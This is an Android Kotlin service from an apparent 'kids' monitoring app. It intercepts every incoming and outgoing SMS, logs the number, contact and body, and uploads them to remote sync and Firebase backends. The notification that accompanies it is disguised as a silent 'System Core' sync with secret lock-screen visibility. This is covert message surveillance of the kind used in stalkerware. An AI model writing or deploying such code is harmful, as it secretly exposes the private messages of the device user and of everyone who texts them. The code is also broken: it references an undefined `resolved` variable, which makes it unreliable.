package com.vyra.kids.services

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Telephony
import android.util.Log
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.NetworkSyncManager

class SmsObserverService : Service() {

    private var smsObserver: ContentObserver? = null
    private var lastRecordedSmsId: String? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                AppConstants.SERVICE_NOTIFICATION_ID + 3,
                createNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(AppConstants.SERVICE_NOTIFICATION_ID + 3, createNotification())
        }
        registerSmsObserver()
    }

    private fun createNotification(): android.app.Notification {
        val channelId = AppConstants.SERVICE_NOTIFICATION_CHANNEL
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                channelId,
                "System Core",
                android.app.NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            nm.createNotificationChannel(channel)
        }

        return androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Core")
            .setContentText("Sync active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    private fun registerSmsObserver() {
        val uri = Uri.parse("content://sms")
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                fetchLatestSms()
            }
        }

        try {
            contentResolver.registerContentObserver(uri, true, smsObserver!!)
            Log.i(AppConstants.TAG, "SMS ContentObserver registered")
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error registering SMS observer", e)
        }
    }

    private fun fetchLatestSms() {
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("_id", "address", "body", "date", "type"),
                null,
                null,
                "date DESC LIMIT 1"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val id = it.getString(it.getColumnIndexOrThrow("_id"))
                    if (id == lastRecordedSmsId) return // Already processed
                    lastRecordedSmsId = id

                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
                    val type = it.getInt(it.getColumnIndexOrThrow("type")) // 1 = inbox, 2 = sent

                    val direction = if (type == 2) "OUTGOING" else "INCOMING"
                    val senderName = if (type == 2) "Aryan (Child)" else resolved.name
                    Log.i(AppConstants.TAG, "Captured SMS [$direction] to/from $address ($senderName): $body")

                    val payload = mapOf(
                        "type" to "SMS_LOG",
                        "direction" to direction,
                        "phoneNumber" to address,
                        "contactName" to resolved.name,
                        "message" to body,
                        "timestamp" to date,
                        "isDeletedBackup" to true
                    )
                    NetworkSyncManager.getInstance(this).syncData("sms", payload)

                    val syncManager = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
                    syncManager.syncChatMessage(
                        msgId = "sms_${date}_$id",
                        app = "SMS",
                        sender = senderName,
                        text = if (type == 2) "📤 [To ${resolved.name}]: $body" else body,
                        isDeletedBySender = false,
                        isWatchlistTarget = false
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error fetching latest SMS", e)
        }
    }

    override fun onDestroy() {
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        super.onDestroy()
    }

    /**
     * BroadcastReceiver for Real-Time Incoming SMS.
     */
    class SmsBroadcastReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (context == null || intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val sender = sms.displayOriginatingAddress ?: "Unknown"
                val body = sms.displayMessageBody ?: ""
                val timestamp = sms.timestampMillis

                val resolved = com.vyra.kids.core.ContactResolver.resolve(context, sender)
                Log.i(AppConstants.TAG, "Instant Incoming SMS from ${resolved.name} ($sender): $body")

                val payload = mapOf(
                    "type" to "SMS_LOG",
                    "direction" to "INCOMING",
                    "phoneNumber" to sender,
                    "contactName" to resolved.name,
                    "message" to body,
                    "timestamp" to timestamp
                )
                NetworkSyncManager.getInstance(context).syncData("sms", payload)

                val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(context)
                firebaseSync.syncChatMessage(
                    msgId = "sms_inc_${timestamp}",
                    app = "SMS",
                    sender = resolved.name,
                    text = body,
                    isDeletedBySender = false,
                    isWatchlistTarget = false
                )
            }
        }
    }
}
